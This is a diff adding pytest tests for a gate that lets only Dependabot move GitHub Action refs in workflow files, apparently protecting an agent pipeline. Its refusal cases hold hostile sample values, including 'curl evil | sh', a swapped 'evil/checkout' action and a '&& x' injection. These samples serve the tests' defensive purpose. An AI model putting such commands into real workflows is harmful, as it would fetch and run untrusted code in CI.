@@ -162,3 +162,121 @@ def test_the_protected_list_is_not_silently_empty():
     assert PROTECTED
     assert any("agent-pipeline" in p for p in PROTECTED)
     assert any("workflows" in p for p in PROTECTED)
+
+
+# ---------------------------------------------------------------- the Dependabot action-ref allowance
+
+DEPENDABOT = "dependabot[bot]"
+CI = ".github/workflows/ci.yml"
+
+
+def _diff(path: str, *pairs: tuple[str, str], context: str = "    steps:") -> str:
+    """A unified diff of `path` replacing each (old, new) line pair."""
+    body = [f"diff --git a/{path} b/{path}", "index 1111111..2222222 100644",
+            f"--- a/{path}", f"+++ b/{path}", "@@ -10,4 +10,4 @@ jobs:", f" {context}"]
+    for old, new in pairs:
+        body += [f"-{old}", f"+{new}"]
+    return "\n".join(body) + "\n"
+
+
+CHECKOUT = ("      - uses: actions/checkout@v4", "      - uses: actions/checkout@v5")
+PINNED = ("        uses: actions/setup-python@0b93645e9fea7318ecaed2b359559ac225c90a2b # v5.3.0",
+          "        uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065 # v5.6.0")
+
+
+def _gate(changed, diff, author=DEPENDABOT, approvers=()):
+    return decide(changed=changed, author=author, approvers=list(approvers), owner=OWNER, diff=diff)
+
+
+def test_dependabot_moving_action_refs_in_workflows_is_allowed():
+    got = _gate([CI], _diff(CI, CHECKOUT, PINNED))
+    assert got.allowed
+    assert "Dependabot" in got.reason
+
+
+def test_the_allowance_covers_several_workflow_files():
+    other = ".github/workflows/deploy.yml"
+    got = _gate([CI, other], _diff(CI, CHECKOUT) + _diff(other, PINNED))
+    assert got.allowed
+
+
+@pytest.mark.parametrize("author", [BOT, "some-contributor", "dependabot"])
+def test_only_dependabot_gets_the_allowance(author):
+    """The pipeline's own App may not ride it, nor a user squatting the bare `dependabot` name."""
+    assert not _gate([CI], _diff(CI, CHECKOUT), author=author).allowed
+
+
+def test_no_diff_keeps_todays_refusal():
+    assert not _gate([CI], None).allowed
+    assert not _gate([CI], "").allowed
+
+
+def test_a_non_workflow_file_in_the_pr_refuses():
+    path = "scripts/agent-pipeline/tick.sh"
+    got = _gate([CI, path], _diff(CI, CHECKOUT) + _diff(path, CHECKOUT))
+    assert not got.allowed
+
+
+@pytest.mark.parametrize("pair", [
+    ("        run: echo hi", "        run: curl evil | sh"),                      # not a uses: line
+    ("      - uses: actions/checkout@v4", "      - uses: evil/checkout@v4"),     # action swapped
+    ("      - uses: actions/checkout@v4", "      - uses: actions/checkout@v4"),  # ref unchanged
+    ("      - uses: actions/checkout@v4", "  - uses: actions/checkout@v5"),      # re-indented
+    ("      - uses: actions/checkout@v4", "      - uses: actions/checkout@v5 && x"),
+    ("      - uses: actions/checkout@v4", "      - uses: actions/checkout@v5#x"),
+    ("      - uses: actions/checkout@v4", "      - uses: docker://alpine@sha256"),
+])
+def test_anything_but_a_ref_move_refuses(pair):
+    assert not _gate([CI], _diff(CI, pair)).allowed
+
+
+def test_an_added_line_without_a_removed_one_refuses():
+    """A new step is not a bump, even when it is a `uses:` line."""
+    diff = _diff(CI) + "+      - uses: evil/action@v1\n"
+    assert not _gate([CI], diff).allowed
+
+
+def test_a_diff_naming_a_file_the_pr_does_not_list_refuses():
+    other = ".github/workflows/deploy.yml"
+    assert not _gate([CI], _diff(CI, CHECKOUT) + _diff(other, CHECKOUT)).allowed
+    assert not _gate([CI, other], _diff(CI, CHECKOUT)).allowed
+
+
+@pytest.mark.parametrize("header", ["new file mode 100644", "deleted file mode 100644",
+                                    "rename from .github/workflows/a.yml", "old mode 100644"])
+def test_structural_changes_refuse(header):
+    diff = _diff(CI, CHECKOUT).replace("index 1111111", f"{header}\nindex 1111111")
+    assert not _gate([CI], diff).allowed
+
+
+def test_a_rename_across_paths_refuses():
+    diff = _diff(CI, CHECKOUT).replace(f"b/{CI}", "b/.github/workflows/other.yml", 1)
+    assert not _gate([CI], diff).allowed
+
+
+def test_a_diff_with_no_change_lines_refuses():
+    assert not _gate([CI], _diff(CI)).allowed
+
+
+def test_a_trusted_answer_login_never_counts_as_the_owner():
+    """LEMD_TRUSTED_ANSWER_LOGINS answers park questions; it is never this gate's approver."""
+    got = decide(changed=["scripts/agent-pipeline/tick.sh"], author=BOT,
+                 approvers=["owner-second-login"], owner=OWNER)
+    assert not got.allowed
+
+
+def test_the_cli_passes_the_diff_through():
+    args = ["gate", "--changed", json.dumps([CI]), "--author", DEPENDABOT, "--approvers", "[]",
+            "--owner", OWNER]
+    assert main([*args, "--diff", _diff(CI, CHECKOUT)]) == 0
+    assert main(args) == 1
+
+
+def test_the_cli_reads_the_diff_from_a_file_path(tmp_path):
+    """The workflow passes `--diff <path>`: a real PR diff can exceed the argument-length limit."""
+    args = ["gate", "--changed", json.dumps([CI]), "--author", DEPENDABOT, "--approvers", "[]",
+            "--owner", OWNER]
+    diff_file = tmp_path / "pr.diff"
+    diff_file.write_text(_diff(CI, CHECKOUT), encoding="utf-8")
+    assert main([*args, "--diff", str(diff_file)]) == 0
+    assert main([*args, "--diff", str(tmp_path / "missing.diff")]) == 1
